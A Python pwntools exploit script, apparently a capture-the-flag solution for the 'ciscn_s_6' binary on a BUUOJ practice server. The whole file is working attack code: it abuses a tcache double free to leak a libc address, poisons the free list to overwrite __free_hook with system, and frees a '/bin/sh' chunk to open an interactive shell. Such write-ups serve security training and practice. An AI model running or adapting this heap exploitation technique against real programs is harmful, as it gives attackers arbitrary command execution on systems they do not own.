#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/11 19:07:39
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('ciscn_s_6')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
else:
    IP = 'node3.buuoj.cn'
    port = 28160
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/18-64-libc-2.27.so')
    one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
elf = ELF('ciscn_s_6')

def cmd(choice):
    sh.recvuntil("choice:")
    sh.sendline(str(choice))

def add(size,name,call):
    cmd(1)
    sh.recvuntil("Please input the size of compary's name\n")
    sh.sendline(str(size))
    sh.recvuntil("please input name:\n")
    sh.sendline(name)
    sh.recvuntil("please input compary call:")
    sh.sendline(call)

def show(idx):
    cmd(2)
    sh.recvuntil("Please input the index:\n")
    sh.sendline(str(idx))

def dele(idx):
    cmd(3)
    sh.recvuntil("Please input the index:\n")
    sh.sendline(str(idx))

add(0x80,"aaaa","1111")
add(0x20,"bbbb","2222")
add(0x20,"/bin/sh\x00","3333")
for i in range(0,7):
    dele(0)

dele(0)
show(0)
libc_base = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - 0x3ebca0
log.info("Success leak libc_base:0x%x"%libc_base)
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
for i in range(0,3):
    dele(1)

add(0x20,p64(free_hook),"aaaa")
add(0x20,"aaaa","bbbb")
add(0x20,p64(system_addr),"aaaaa")
dele(2)
sh.interactive()